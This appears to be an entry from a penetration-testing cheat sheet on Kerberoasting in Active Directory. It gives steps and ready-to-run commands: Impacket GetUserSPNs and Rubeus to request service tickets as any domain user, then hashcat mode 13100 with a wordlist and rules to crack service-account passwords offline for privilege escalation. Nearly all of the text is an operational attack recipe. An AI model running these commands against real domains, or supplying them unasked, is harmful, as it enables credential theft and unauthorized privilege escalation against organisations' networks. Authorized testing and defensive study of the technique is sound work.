# 17.04 Kerberoasting

> Request a TGS for any SPN as any domain user, then crack the service account's key offline with `hashcat -m 13100`.

## Overview

Any domain user can request a service ticket (TGS) for any account with a registered SPN. The TGS is encrypted with the service account's key — crack offline with hashcat -m 13100.

## Steps

- **Find SPN accounts** — Rubeus kerberoast / GetUserSPNs.py.
- **Crack offline** — hashcat -m 13100 (RC4) or 19700 (AES256).
- **Use cracked creds** — usually higher-privilege service accounts.

## Commands

### Kerberoast end-to-end

```bash
# Linux
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -output roast.txt
# Windows
Rubeus.exe kerberoast /outfile:roast.txt /nowrap
# Crack
hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
